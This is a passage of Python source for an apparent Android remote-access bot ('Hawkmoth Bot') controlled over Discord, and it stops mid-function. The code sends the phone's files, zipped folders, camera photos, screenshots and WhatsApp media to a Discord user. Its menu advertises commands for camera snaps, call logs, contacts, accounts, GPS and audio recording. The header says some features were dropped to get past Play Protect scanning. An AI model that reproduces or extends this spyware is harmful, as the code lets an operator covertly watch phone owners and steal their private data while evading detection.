"""
╔══════════════════════════════════════════════════════════════════╗
║              Hawkmoth Bot v4.0 — النسخة الشاملة                 ║
║                                                                  ║
║  الميزات:                                                        ║
║    • 60+ أمرًا منظّمة حسب الفئة                                  ║
║    • ✅ لا يوجد توكن مدمج — يستقبل من Java                       ║
║    • ✅ Thread-safe state                                        ║
║    • ✅ Cache ذكي + Rate Limiting                                ║
║    • ✅ معالجة أخطاء شاملة مع رسائل عربية واضحة                 ║
║    • ✅ إحصائيات كاملة                                           ║
║    • ✅ دعم كامل لكل إصدارات Android (API 23 → 34+)             ║
║    • ✅ الأوامر المحذوفة: SMS، Notifications (لأجل Play Protect) ║
║    • ✅ الأوامر الجديدة: CallLog، GPS، Audio، Phone، Sensors     ║
╚══════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import json
import asyncio
import logging
import tempfile
import zipfile
import time
import re
import socket
import platform
import threading
import traceback
from typing import Optional, Dict, Any, List
from collections import defaultdict

import discord
from discord.ext import commands
from discord import app_commands

# ═══════════════════════════════════════════════════════════════════
#                       استيراد bridge بأمان
# ═══════════════════════════════════════════════════════════════════
_bridge = None
try:
    import bridge as _bridge
    _BRIDGE_AVAILABLE = True
except ImportError as _e:
    _BRIDGE_AVAILABLE = False
    print(f"⚠️ bridge.py not available: {_e}", flush=True)


# ═══════════════════════════════════════════════════════════════════
#                       الإعدادات الثابتة
# ═══════════════════════════════════════════════════════════════════
VERSION = "4.0.0"
DEFAULT_PREFIX = "!"
DISCORD_LIMIT_MB = 24.0
FILES_PER_PAGE = 20
RATE_LIMIT_PER_MIN = 20
CACHE_TTL_SEC = 30


logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("HawkmothBot")
log.info(f"🔧 hawkmoth_bot.py v{VERSION} loading...")


def get_version() -> str:
    return VERSION


# ═══════════════════════════════════════════════════════════════════
#                       حالة البوت (thread-safe)
# ═══════════════════════════════════════════════════════════════════
class BotState:
    def __init__(self):
        self._lock = threading.RLock()
        self.token: Optional[str] = None
        self.prefix: str = DEFAULT_PREFIX
        self.owner_id: Optional[int] = None
        self.guild_id: Optional[int] = None
        self.allowed_user_id: Optional[int] = None
        self.is_running: bool = False
        self.start_time: Optional[float] = None
        self.last_error: Optional[str] = None
        self.stop_event = threading.Event()
        self.loop: Any = None

    def reset(self):
        with self._lock:
            self.is_running = False
            self.start_time = None
            self.stop_event = threading.Event()
            self.loop = None

    def mark_running(self):
        with self._lock:
            self.is_running = True
            self.start_time = time.time()

    def mark_stopped(self):
        with self._lock:
            self.is_running = False

    def set_error(self, err):
        with self._lock:
            self.last_error = str(err) if err else None

    def get_stop_event(self):
        with self._lock:
            return self.stop_event

    def get_allowed_id(self):
        with self._lock:
            return self.allowed_user_id or self.owner_id


STATE = BotState()


# ═══════════════════════════════════════════════════════════════════
#                       الإحصائيات
# ═══════════════════════════════════════════════════════════════════
class Stats:
    def __init__(self):
        self.commands_used = defaultdict(int)
        self.errors = defaultdict(int)
        self.files_sent = 0
        self.bytes_sent = 0
        self.started_at = time.time()
        self._lock = threading.Lock()

    def record_command(self, name):
        with self._lock:
            self.commands_used[name] += 1

    def record_error(self, name):
        with self._lock:
            self.errors[name] += 1

    def record_file(self, size):
        with self._lock:
            self.files_sent += 1
            self.bytes_sent += size

    def uptime(self):
        return time.time() - self.started_at

    def to_dict(self):
        with self._lock:
            uptime = self.uptime()
            return {
                "uptime_seconds": int(uptime),
                "uptime_human": self._fmt_time(uptime),
                "files_sent": self.files_sent,
                "bytes_sent": self.bytes_sent,
                "bytes_sent_human": _fmt_size(self.bytes_sent),
                "total_commands": sum(self.commands_used.values()),
                "top_commands": sorted(
                    self.commands_used.items(), key=lambda x: -x[1]
                )[:10],
                "errors": dict(self.errors),
            }

    @staticmethod
    def _fmt_time(seconds):
        d = int(seconds // 86400)
        h = int((seconds % 86400) // 3600)
        m = int((seconds % 3600) // 60)
        s = int(seconds % 60)
        parts = []
        if d: parts.append(f"{d}d")
        if h: parts.append(f"{h}h")
        if m: parts.append(f"{m}m")
        parts.append(f"{s}s")
        return " ".join(parts)


STATS = Stats()


# ═══════════════════════════════════════════════════════════════════
#                       Rate Limiter
# ═══════════════════════════════════════════════════════════════════
class RateLimiter:
    def __init__(self, max_per_minute=20):
        self.max = max_per_minute
        self.calls = defaultdict(list)
        self._lock = threading.Lock()

    def check(self, user_id):
        with self._lock:
            now = time.time()
            window = 60
            calls = [t for t in self.calls[user_id] if now - t < window]
            self.calls[user_id] = calls
            if len(calls) >= self.max:
                return False
            self.calls[user_id].append(now)
            return True

    def reset(self, user_id):
        with self._lock:
            self.calls[user_id] = []


RATE_LIMITER = RateLimiter(RATE_LIMIT_PER_MIN)


# ═══════════════════════════════════════════════════════════════════
#                       TTL Cache
# ═══════════════════════════════════════════════════════════════════
class TTLCache:
    def __init__(self, ttl_sec=30, max_size=500):
        self.ttl = ttl_sec
        self.max = max_size
        self.store = {}
        self._lock = threading.Lock()

    def get(self, key):
        with self._lock:
            if key not in self.store:
                return None
            value, expire_at = self.store[key]
            if time.time() > expire_at:
                del self.store[key]
                return None
            return value

    def set(self, key, value):
        with self._lock:
            if len(self.store) >= self.max:
                oldest = min(self.store.items(), key=lambda x: x[1][1])
                del self.store[oldest[0]]
            self.store[key] = (value, time.time() + self.ttl)

    def clear(self):
        with self._lock:
            self.store.clear()

    def size(self):
        with self._lock:
            return len(self.store)


LIST_CACHE = TTLCache(ttl_sec=CACHE_TTL_SEC, max_size=200)


# ═══════════════════════════════════════════════════════════════════
#                       اكتشاف جذور التخزين
# ═══════════════════════════════════════════════════════════════════
def _discover_storage_roots():
    roots = []
    seen = set()

    def add(p):
        if not p:
            return
        try:
            rp = os.path.realpath(p)
        except Exception:
            return
        if rp in seen or not os.path.isdir(rp):
            return
        seen.add(rp)
        roots.append(rp)

    if _BRIDGE_AVAILABLE and _bridge is not None:
        for fn_name in ("get_files_dir", "get_external_files_dir"):
            try:
                fn = getattr(_bridge, fn_name, None)
                if fn:
                    p = fn()
                    if p:
                        add(p)
            except Exception:
                pass

    add("/sdcard")
    add("/storage/emulated/0")
    add(os.getenv("EXTERNAL_STORAGE", ""))

    try:
        for entry in os.listdir("/storage"):
            full = os.path.join("/storage", entry)
            if os.path.isdir(full):
                add(full)
    except Exception:
        pass

    return roots


DISCOVERED_ROOTS = _discover_storage_roots()
ALLOWED_ROOT = DISCOVERED_ROOTS[0] if DISCOVERED_ROOTS else "/sdcard"

log.info(f"📁 Active root: {ALLOWED_ROOT}")
log.info(f"📁 Discovered roots: {len(DISCOVERED_ROOTS)}")


def _safe_makedirs(path, fallback):
    try:
        os.makedirs(path, exist_ok=True)
        return path
    except Exception:
        return fallback


UPLOAD_DIR = _safe_makedirs(
    os.path.join(ALLOWED_ROOT, "Pictures", "HawkmothUploads"),
    tempfile.gettempdir(),
)

SCREENSHOT_DIR = _safe_makedirs(
    os.path.join(ALLOWED_ROOT, "DCIM", "HawkmothShots"),
    tempfile.gettempdir(),
)


# ═══════════════════════════════════════════════════════════════════
#                       ميزات البوت
# ═══════════════════════════════════════════════════════════════════
HAS_PIL = False
try:
    from PIL import Image
    HAS_PIL = True
    log.info("✅ PIL available")
except ImportError:
    log.warning("⚠️ PIL not available — no compression")


DEVICE_NAME = socket.gethostname() or "Android"

CAMERA_PATHS = [
    "DCIM/Camera", "DCIM/camera", "DCIM/Camera/RAW",
    "Pictures/Camera", "Pictures/Photos",
    "Camera", "camera", "Photos",
]
SCREENSHOT_PATHS = [
    "DCIM/Screenshots", "DCIM/screenshots",
    "Pictures/Screenshots", "Pictures/screenshots",
    "Screenshots", "screenshots",
]
DOWNLOAD_PATHS = ["Download", "Downloads", "download", "downloads"]
DOCUMENT_PATHS = ["Documents", "documents", "Docs"]
WHATSAPP_MEDIA_PATHS = [
    "Android/media/com.whatsapp/WhatsApp/Media",
    "WhatsApp/Media",
    "Android/media/com.whatsapp.w4b/WhatsApp Business/Media",
]

_path_map = {}
_path_counter = [0]
_path_lock = threading.Lock()

bulk_state = {'suspended': False, 'resume_dir': None, 'resume_index': 0}
FAVORITES = []


# ═══════════════════════════════════════════════════════════════════
#                       دوال مساعدة عامة
# ═══════════════════════════════════════════════════════════════════
def short_key(path):
    with _path_lock:
        k = str(_path_counter[0])
        _path_counter[0] += 1
        _path_map[k] = path
        if len(_path_map) > 1000:
            for old in list(_path_map.keys())[:200]:
                del _path_map[old]
        return k


def resolve_key(k):
    with _path_lock:
        return _path_map.get(k, "")


def is_path_allowed(path):
    try:
        real = os.path.realpath(path)
        for root in DISCOVERED_ROOTS or [ALLOWED_ROOT]:
            rr = os.path.realpath(root)
            if real == rr or real.startswith(rr + os.sep):
                return True
        return False
    except Exception:
        return False


def _fmt_size(n):
    try:
        n = float(n)
    except Exception:
        return "?"
    for unit in ('B', 'KB', 'MB', 'GB'):
        if n < 1024:
            return f"{n:.1f}{unit}"
        n /= 1024
    return f"{n:.1f}TB"


def _find_dir_in_roots(candidates):
    for root in DISCOVERED_ROOTS:
        for rel in candidates:
            try:
                p = os.path.join(root, *rel.split("/"))
                if os.path.isdir(p):
                    return p
            except Exception:
                continue
    return None


def _get_icon(filename, is_dir=False):
    if is_dir:
        return "📁"
    ext = os.path.splitext(filename)[1].lower()
    icons = {
        ".jpg": "🖼️", ".jpeg": "🖼️", ".png": "🖼️", ".gif": "🎞️",
        ".webp": "🖼️", ".bmp": "🖼️", ".heic": "🖼️",
        ".mp4": "🎬", ".mkv": "🎬", ".avi": "🎬", ".mov": "🎬",
        ".mp3": "🎵", ".wav": "🎵", ".ogg": "🎵", ".m4a": "🎵",
        ".pdf": "📕", ".doc": "📘", ".docx": "📘",
        ".xls": "📗", ".xlsx": "📗", ".ppt": "📙", ".pptx": "📙",
        ".zip": "🗜️", ".rar": "🗜️", ".tar": "🗜️", ".gz": "🗜️",
        ".apk": "📦", ".exe": "⚙️",
        ".txt": "📄", ".log": "📄", ".md": "📖",
        ".py": "🐍", ".java": "☕", ".js": "📜", ".html": "🌐",
        ".json": "⚙️", ".xml": "📋", ".yml": "📋", ".yaml": "📋",
    }
    return icons.get(ext, "📄")


def _build_tree(root, max_depth=3, current_depth=0, max_items=60, prefix=""):
    lines = []
    if current_depth > max_depth:
        return lines
    try:
        items = sorted(os.listdir(root))[:max_items]
    except Exception as e:
        return [f"{prefix}❌ {e}"]
    for i, name in enumerate(items):
        full = os.path.join(root, name)
        is_last = (i == len(items) - 1)
        connector = "└── " if is_last else "├── "
        is_dir = os.path.isdir(full)
        icon = _get_icon(name, is_dir)
        if is_dir:
            lines.append(f"{prefix}{connector}{icon} {name}/")
            if current_depth < max_depth:
                ext = "    " if is_last else "│   "
                lines.extend(_build_tree(
                    full, max_depth, current_depth + 1,
                    max_items, prefix + ext
                ))
        else:
            try:
                sz = _fmt_size(os.path.getsize(full))
            except Exception:
                sz = "?"
            lines.append(f"{prefix}{connector}{icon} {name} ({sz})")
    return lines


async def _compress_image(src_path):
    if not HAS_PIL:
        return src_path
    try:
        from PIL import Image
        root, _ = os.path.splitext(src_path)
        out = root + "_compressed.jpg"
        with Image.open(src_path) as img:
            img.thumbnail((1600, 1600), Image.LANCZOS)
            if img.mode in ('RGBA', 'P', 'LA'):
                img = img.convert('RGB')
            img.save(out, format='JPEG', quality=85, optimize=True)
        return out
    except Exception as e:
        log.warning(f"compress failed: {e}")
        return src_path


# ═══════════════════════════════════════════════════════════════════
#                       إنشاء البوت
# ═══════════════════════════════════════════════════════════════════
intents = discord.Intents.default()
intents.messages = True
intents.message_content = True
intents.guilds = True

bot = commands.Bot(
    command_prefix=DEFAULT_PREFIX,
    intents=intents,
    help_command=None,
    case_insensitive=True,
    strip_after_prefix=True,
)


# ═══════════════════════════════════════════════════════════════════
#                       Helpers للتحقق
# ═══════════════════════════════════════════════════════════════════
def _check(interaction) -> bool:
    allowed = STATE.get_allowed_id()
    return allowed is not None and interaction.user.id == allowed


def _bridge_ready() -> bool:
    return _BRIDGE_AVAILABLE and _bridge is not None


async def _ensure_bridge(interaction) -> bool:
    """فحص توفر bridge وإرسال رسالة خطأ عند الحاجة."""
    if not _bridge_ready():
        await interaction.followup.send(
            "❌ **جسر Python غير متاح**\n"
            "تأكد من تشغيل BotService بشكل صحيح."
        )
        return False
    return True


# ═══════════════════════════════════════════════════════════════════
#                       FileBrowserView
# ═══════════════════════════════════════════════════════════════════
class FileBrowserView(discord.ui.View):
    def __init__(self, path, page=0, sort_by="name"):
        super().__init__(timeout=1800)
        self.path = path
        self.page = page
        self.sort_by = sort_by
        self.total = 0
        self._build()

    def _sort_items(self, items):
        def key(x):
            full = os.path.join(self.path, x)
            is_dir = os.path.isdir(full)
            if self.sort_by == "date":
                try:
                    m = os.path.getmtime(full)
                except Exception:
                    m = 0
                return (not is_dir, -m)
            elif self.sort_by == "size":
                try:
                    s = os.path.getsize(full)
                except Exception:
                    s = 0
                return (not is_dir, -s)
            else:
                return (not is_dir, x.lower())
        return sorted(items, key=key)

    def _build(self):
        try:
            raw = os.listdir(self.path)
        except PermissionError:
            self.add_item(discord.ui.Button(
                label="❌ لا صلاحية", disabled=True))
            return
        except Exception as e:
            self.add_item(discord.ui.Button(
                label=f"خطأ: {str(e)[:50]}", disabled=True))
            return

        items = self._sort_items(raw)
        self.total = len(items)
        start = self.page * FILES_PER_PAGE
        end = min(start + FILES_PER_PAGE, self.total)
        page_items = items[start:end]

        options = []
        for name in page_items:
            full = os.path.join(self.path, name)
            is_dir = os.path.isdir(full)
            icon = _get_icon(name, is_dir)
            if is_dir:
                options.append(discord.SelectOption(
                    label=f"{icon} {name}"[:100],
                    value=f"d:{short_key(full)}",
                    description="📁 مجلد"
                ))
            else:
                try:
                    sz = _fmt_size(os.path.getsize(full))
                except Exception:
                    sz = "?"
                options.append(discord.SelectOption(
                    label=f"{icon} {name}"[:100],
                    value=f"f:{short_key(full)}",
                    description=f"ملف · {sz}"
                ))

        if options:
            select = discord.ui.Select(
                placeholder=f"اختر ({start+1}-{end} من {self.total})",
                options=options, min_values=1, max_values=1
            )
            select.callback = self._select_cb()
            self.add_item(select)

        parent = os.path.dirname(self.path.rstrip('/')) or '/'
        if self.path != '/' and parent != self.path and is_path_allowed(parent):
            btn = discord.ui.Button(
                label="⬆️ ..", style=discord.ButtonStyle.secondary)
            btn.callback = self._nav_cb(parent, 0)
            self.add_item(btn)

        if self.page > 0:
            btn = discord.ui.Button(
                label="⬅️", style=discord.ButtonStyle.secondary)
            btn.callback = self._nav_cb(self.path, self.page - 1)
            self.add_item(btn)

        btn = discord.ui.Button(
            label="🗜️ ZIP", style=discord.ButtonStyle.danger)
        btn.callback = self._zip_cb(self.path)
        self.add_item(btn)

        if end < self.total:
            btn = discord.ui.Button(
                label="➡️", style=discord.ButtonStyle.secondary)
            btn.callback = self._nav_cb(self.path, self.page + 1)
            self.add_item(btn)

        for label, mode in (("🔤 اسم", "name"), ("📅 تاريخ", "date"),
                             ("📊 حجم", "size")):
            style = (discord.ButtonStyle.success
                     if self.sort_by == mode
                     else discord.ButtonStyle.secondary)
            btn = discord.ui.Button(label=label, style=style)
            btn.callback = self._sort_cb(mode)
            self.add_item(btn)

        quick = [
            ("📸 كاميرا", _find_dir_in_roots(CAMERA_PATHS)),
            ("🖼️ لقطات", _find_dir_in_roots(SCREENSHOT_PATHS)),
            ("📥 تنزيلات", _find_dir_in_roots(DOWNLOAD_PATHS)),
            ("📄 مستندات", _find_dir_in_roots(DOCUMENT_PATHS)),
            ("💬 واتساب", _find_dir_in_roots(WHATSAPP_MEDIA_PATHS)),
        ]
        for label, qpath in quick:
            if qpath and qpath != self.path:
                btn = discord.ui.Button(
                    label=label, style=discord.ButtonStyle.primary)
                btn.callback = self._nav_cb(qpath, 0)
                self.add_item(btn)

    def title(self):
        start = self.page * FILES_PER_PAGE
        end = min(start + FILES_PER_PAGE, self.total)
        sort_label = {"name": "اسم", "date": "تاريخ",
                      "size": "حجم"}.get(self.sort_by, "اسم")
        return (
            f"📂 `{self.path}`\n"
            f"({start+1}-{end} من {self.total}) | {sort_label} | "
            f"🖥️ `{DEVICE_NAME}`"
        )

    def _select_cb(self):
        async def cb(interaction: discord.Interaction):
            if not _check(interaction):
                await interaction.response.send_message(
                    "غير مصرح.", ephemeral=True)
                return
            value = interaction.data.get("values", [""])[0]
            if ":" not in value:
                await interaction.response.defer()
                return
            kind, key = value.split(":", 1)
            path = resolve_key(key)
            if not path or not is_path_allowed(path):
                await interaction.response.send_message(
                    "مسار غير صالح.", ephemeral=True)
                return
            if kind == "d":
                view = FileBrowserView(path, 0, self.sort_by)
                try:
                    await interaction.response.edit_message(
                        content=view.title(), view=view)
                except Exception:
                    await interaction.response.send_message(
                        content=view.title(), view=view)
            else:
                await interaction.response.defer()
                await _send_any_file(interaction, path)
        return cb

    def _nav_cb(self, path, page):
        async def cb(interaction: discord.Interaction):
            if not _check(interaction):
                await interaction.response.send_message(
                    "غير مصرح.", ephemeral=True)
                return
            if not is_path_allowed(path):
                await interaction.response.send_message(
                    "❌ خارج النطاق.", ephemeral=True)
                return
            view = FileBrowserView(path, page, self.sort_by)
            try:
                await interaction.response.edit_message(
                    content=view.title(), view=view)
            except Exception:
                await interaction.response.send_message(
                    content=view.title(), view=view)
        return cb

    def _sort_cb(self, mode):
        async def cb(interaction: discord.Interaction):
            if not _check(interaction):
                await interaction.response.send_message(
                    "غير مصرح.", ephemeral=True)
                return
            view = FileBrowserView(self.path, 0, mode)
            try:
                await interaction.response.edit_message(
                    content=view.title(), view=view)
            except Exception:
                await interaction.response.send_message(
                    content=view.title(), view=view)
        return cb

    def _zip_cb(self, path):
        async def cb(interaction: discord.Interaction):
            if not _check(interaction):
                await interaction.response.send_message(
                    "غير مصرح.", ephemeral=True)
                return
            await interaction.response.defer()
            await _send_zip_of_dir(interaction, path)
        return cb


# ═══════════════════════════════════════════════════════════════════
#                       دوال الإرسال
# ═══════════════════════════════════════════════════════════════════
async def _send_any_file(interaction, path):
    if not is_path_allowed(path):
        await interaction.followup.send(f"❌ خارج النطاق: `{path}`")
        return
    if not os.path.isfile(path):
        await interaction.followup.send(f"الملف غير موجود: `{path}`")
        return
    try:
        size_mb = os.path.getsize(path) / (1024 * 1024)
    except Exception:
        size_mb = 0
    if size_mb > DISCORD_LIMIT_MB:
        await interaction.followup.send(
            f"⚠️ {size_mb:.1f}MB > {DISCORD_LIMIT_MB}MB")
        return
    try:
        size = os.path.getsize(path)
        await interaction.followup.send(file=discord.File(path))
        STATS.record_file(size)
    except Exception as e:
        STATS.record_error("send_file")
        await interaction.followup.send(f"خطأ: {e}")


async def _send_zip_of_dir(interaction, path):
    if not is_path_allowed(path):
        await interaction.followup.send(f"❌ خارج النطاق: `{path}`")
        return
    if not os.path.isdir(path):
        await interaction.followup.send(f"ليس مجلدًا: `{path}`")
        return
    tmp = tempfile.NamedTemporaryFile(delete=False, suffix='.zip')
    tmp.close()
    try:
        with zipfile.ZipFile(tmp.name, 'w', zipfile.ZIP_DEFLATED) as zf:
            for root, _dirs, files in os.walk(path):
                for fn in files:
                    full = os.path.join(root, fn)
                    rel = os.path.relpath(full, path)
                    try:
                        zf.write(full, rel)
                    except Exception:
                        continue
        size_mb = os.path.getsize(tmp.name) / (1024 * 1024)
        if size_mb > DISCORD_LIMIT_MB:
            await interaction.followup.send(
                f"⚠️ الأرشيف {size_mb:.1f}MB > الحد")
            return
        fname = f"{os.path.basename(path.rstrip('/')) or 'root'}.zip"
        size = os.path.getsize(tmp.name)
        await interaction.followup.send(
            file=discord.File(tmp.name, filename=fname))
        STATS.record_file(size)
    except Exception as e:
        STATS.record_error("send_zip")
        await interaction.followup.send(f"خطأ: {e}")
    finally:
        try:
            os.remove(tmp.name)
        except Exception:
            pass


async def _send_images_bulk(interaction, directory, limit=None,
                             start_index=0):
    global bulk_state
    if not is_path_allowed(directory):
        await interaction.followup.send("❌ المسار خارج النطاق.")
        return
    if not os.path.isdir(directory):
        await interaction.followup.send(f"المجلد غير موجود: `{directory}`")
        return
    try:
        files = sorted(
            [os.path.join(directory, f) for f in os.listdir(directory)
             if f.lower().endswith(
                 (".jpg", ".jpeg", ".png", ".webp", ".gif", ".heic"))],
            key=os.path.getmtime, reverse=True
        )
    except Exception as e:
        await interaction.followup.send(f"خطأ: {e}")
        return
    if limit:
        files = files[:limit]
    if not files:
        await interaction.followup.send("لا توجد صور.")
        return

    bulk_state['suspended'] = False
    bulk_state['resume_dir'] = directory
    bulk_state['resume_index'] = start_index

    await interaction.followup.send(
        f"📤 إرسال من {start_index}/{len(files)} من `{directory}`...")
    sent = 0
    for idx in range(start_index, len(files)):
        if bulk_state['suspended']:
            bulk_state['resume_index'] = idx
            await interaction.followup.send(
                f"⛔ توقف عند {idx}. استخدم `/resume`.")
            return
        fp = files[idx]
        compressed = await _compress_image(fp)
        try:
            size_mb = os.path.getsize(compressed) / (1024 * 1024)
            if size_mb > DISCORD_LIMIT_MB:
                await interaction.followup.send(
                    f"⚠️ {os.path.basename(fp)} ({size_mb:.1f}MB)")
                continue
            size = os.path.getsize(compressed)
            await interaction.followup.send(
                file=discord.File(compressed))
            STATS.record_file(size)
            sent += 1
            await asyncio.sleep(0.5)
        except Exception as e:
            await interaction.followup.send(f"تعذر: {e}")
        finally:
            if compressed != fp and os.path.exists(compressed):
                try:
                    os.remove(compressed)
                except Exception:
                    pass
    bulk_state['resume_dir'] = None
    bulk_state['resume_index'] = 0
    await interaction.followup.send(f"✅ انتهى ({sent} صورة).")


async def _find_files(name_query, roots, max_results=20, max_depth=8,
                       use_regex=False):
    results = []
    skip_dirs = {"Android", ".thumbnails", "cache", ".cache",
                 "node_modules", ".git"}
    if use_regex:
        try:
            pattern = re.compile(name_query, re.IGNORECASE)
        except re.error:
            pattern = None
    else:
        pattern = None
    query = name_query.lower()

    for root in roots:
        if not os.path.isdir(root):
            continue
        try:
            for dirpath, dirnames, filenames in os.walk(root):
                depth = dirpath[len(root):].count(os.sep)
                if depth >= max_depth:
                    dirnames[:] = []
                    continue
                dirnames[:] = [d for d in dirnames
                               if d not in skip_dirs
                               and not d.startswith('.')]
                for fn in filenames:
                    match = (bool(pattern.search(fn)) if pattern
                             else (query in fn.lower()))
                    if match:
                        results.append(os.path.join(dirpath, fn))
                        if len(results) >= max_results:
                            return results
        except Exception:
            continue
    return results


class FindResultsView(discord.ui.View):
    def __init__(self, results, query):
        super().__init__(timeout=900)
        self.results = results
        options = []
        for p in results[:25]:
            name = os.path.basename(p)
            label = f"{_get_icon(name)} {name}"[:80]
            parent = os.path.basename(os.path.dirname(p))[:30]
            options.append(discord.SelectOption(
                label=label,
                value=short_key(p),
                description=f"📁 {parent}"[:100]
            ))
        if options:
            select = discord.ui.Select(
                placeholder=f"اختر ملفًا من {len(results)}",
                options=options, min_values=1, max_values=1
            )
            select.callback = self._cb
            self.add_item(select)

    async def _cb(self, interaction: discord.Interaction):
        if not _check(interaction):
            await interaction.response.send_message(
                "غير مصرح.", ephemeral=True)
            return
        key = interaction.data.get("values", [""])[0]
        path = resolve_key(key)
        if not path or not os.path.isfile(path):
            await interaction.response.send_message(
                "ملف غير موجود.", ephemeral=True)
            return
        await interaction.response.defer()
        await _send_any_file(interaction, path)


# ═══════════════════════════════════════════════════════════════════
#                       الأحداث
# ═══════════════════════════════════════════════════════════════════
_ready_called = {"value": False}
_synced_once = {"value": False}


@bot.event
async def on_ready():
    if _ready_called["value"]:
        return
    _ready_called["value"] = True

    STATE.mark_running()
    log.info(f"✅ Logged in as {bot.user} (ID: {bot.user.id})")
    log.info(f"✅ Connected to {len(bot.guilds)} guild(s)")
    log.info(f"🌉 bridge.py: {'✅' if _BRIDGE_AVAILABLE else '❌'}")

    if _synced_once["value"]:
        return
    try:
        with STATE._lock:
            guild_id = STATE.guild_id

        if guild_id:
            guild = discord.Object(id=guild_id)
            bot.tree.copy_global_to(guild=guild)
            synced = await bot.tree.sync(guild=guild)
        else:
            synced = await bot.tree.sync()
        log.info(f"✅ Synced {len(synced)} slash commands")
        _synced_once["value"] = True
    except Exception as e:
        log.error(f"❌ Sync error: {e}")

    try:
        await bot.change_presence(
            activity=discord.Activity(
                type=discord.ActivityType.watching,
                name="📱 /start"
            ),
            status=discord.Status.online,
        )
    except Exception as e:
        log.warning(f"Presence error: {e}")

    log.info("🎉 البوت جاهز")


@bot.event
async def on_disconnect():
    log.warning("⚠️ Disconnected from Discord")


@bot.event
async def on_resumed():
    log.info("🔄 Session resumed")


@bot.event
async def on_error(event_method, *args, **kwargs):
    log.error(f"⚠️ Unhandled error in {event_method}")
    try:
        print(traceback.format_exc(), flush=True)
    except Exception:
        pass


@bot.event
async def on_message(message):
    allowed = STATE.get_allowed_id()
    if allowed is None or message.author.id != allowed:
        await bot.process_commands(message)
        return

    if not message.attachments:
        await bot.process_commands(message)
        return

    saved = []
    for att in message.attachments:
        try:
            safe_name = re.sub(r'[^\w\-_. ]', '_', att.filename)[:200]
            dest = os.path.join(UPLOAD_DIR, safe_name)
            base, ext = os.path.splitext(dest)
            i = 1
            while os.path.exists(dest):
                dest = f"{base}_{i}{ext}"
                i += 1
            await att.save(dest)
            saved.append(os.path.basename(dest))
        except Exception as e:
            log.error(f"upload save failed: {e}")

    if saved:
        try:
            await message.reply(
                f"📥 حُفظ {len(saved)} ملف في `{UPLOAD_DIR}`:\n" +
                "\n".join(f"• `{n}`" for n in saved),
                mention_author=False
            )
        except Exception:
            pass

    await bot.process_commands(message)


# ═══════════════════════════════════════════════════════════════════
#                       /start — لوحة التحكم
# ═══════════════════════════════════════════════════════════════════
@bot.tree.command(name="start", description="لوحة التحكم الرئيسية")
async def start_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return

    await interaction.response.defer()
    STATS.record_command("start")

    perms = {}
    if _bridge_ready():
        try:
            perms_raw = await asyncio.to_thread(
                _bridge.get_permissions_json)
            perms = json.loads(perms_raw)
        except Exception as e:
            log.error(f"permissions: {e}")

    def mark(key, label):
        val = perms.get(key, False)
        return f"{'✅' if val else '❌'} {label}"

    # ═══ الصلاحيات ═══
    perm_text = (
        "**🔐 الصلاحيات:**\n"
        f"{mark('all_files', '📁 الملفات')}\n"
        f"{mark('camera', '📷 الكاميرا')}\n"
        f"{mark('record_audio', '🎤 الميكروفون')}\n"
        f"{mark('contacts', '👥 جهات الاتصال')}\n"
        f"{mark('fine_location', '📍 الموقع الدقيق')}\n"
        f"{mark('coarse_location', '📍 الموقع التقريبي')}\n"
        f"{mark('read_call_log', '📞 سجل المكالمات')}\n"
        f"{mark('read_phone_state', '📱 حالة الهاتف')}\n"
        f"{mark('call_phone', '☎️ إجراء مكالمة')}\n"
        f"{mark('accounts', '🔑 الحسابات')}\n"
        f"{mark('activity_recognition', '🏃 النشاط')}\n"
        f"{mark('body_sensors', '❤️ مستشعرات الجسم')}\n"
    )

    keys = ['all_files', 'camera', 'record_audio', 'contacts',
            'fine_location', 'read_call_log', 'read_phone_state',
            'call_phone', 'accounts', 'activity_recognition',
            'body_sensors']
    granted = sum(1 for k in keys if perms.get(k, False))
    total = len(keys)

    android_ver = perms.get('android', '?')
    sdk_ver = perms.get('sdk', '?')

    await interaction.followup.send(
        f"╭─────────────────────────────╮\n"
        f"│   🤖 **JvRemotPy v{VERSION}**\n"
        f"╰─────────────────────────────╯\n\n"
        f"🖥️ **الجهاز:** `{DEVICE_NAME}`\n"
        f"📱 **Android:** `{android_ver}` (SDK `{sdk_ver}`)\n"
        f"📊 **الصلاحيات:** **{granted}/{total}**\n\n"
        f"{perm_text}\n"
        f"**📁 المسارات:**\n"
        f"`{ALLOWED_ROOT}`\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"**📁 الملفات**\n"
        f"`/browse` `/storage` `/tree` `/search`\n"
        f"`/find` `/get` `/zip` `/latest`\n"
        f"`/save` `/favorites` `/upload`\n\n"
        f"**📸 الوسائط**\n"
        f"`/camera` `/screenshots` `/downloads`\n"
        f"`/documents` `/whatsapp_media`\n"
        f"`/snap_back` `/snap_front` `/camera_app`\n"
        f"`/pull_camera` `/pull_screens`\n\n"
        f"**📞 الاتصالات (جديد)**\n"
        f"`/calllog` `/call` `/phoneinfo`\n"
        f"`/contacts` `/dial` `/accounts`\n"
        f"`/wa` `/wa_home`\n\n"
        f"**📍 الموقع (جديد)**\n"
        f"`/gps` `/gps_providers` `/ip`\n\n"
        f"**🎤 الصوت (جديد)**\n"
        f"`/record` `/record_stop` `/record_status`\n\n"
        f"**❤️ المستشعرات (جديد)**\n"
        f"`/sensors` `/heartbeat` `/steps`\n"
        f"`/accelerometer` `/gyroscope`\n\n"
        f"**📱 التطبيقات**\n"
        f"`/openapp` `/apps` `/openurl` `/open`\n\n"
        f"**🔧 الأدوات**\n"
        f"`/battery` `/clipboard` `/toast`\n"
        f"`/screenshot` `/roots` `/setroot`\n"
        f"`/rescan` `/storage_test`\n\n"
        f"**ℹ️ معلومات**\n"
        f"`/sysinfo` `/health` `/stats`\n"
        f"`/ping` `/whoami`\n\n"
        f"**⚙️ صيانة**\n"
        f"`/clearcache` `/resume` `/stop`"
    )


# ═══════════════════════════════════════════════════════════════════
#                       الأساسيات
# ═══════════════════════════════════════════════════════════════════
@bot.tree.command(name="ping", description="اختبار سرعة الاستجابة")
async def ping_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("ping")
    start = time.time()
    await interaction.response.send_message("🏓 Pong!")
    latency = (time.time() - start) * 1000
    await interaction.edit_original_response(
        content=(
            f"🏓 **Pong!**\n"
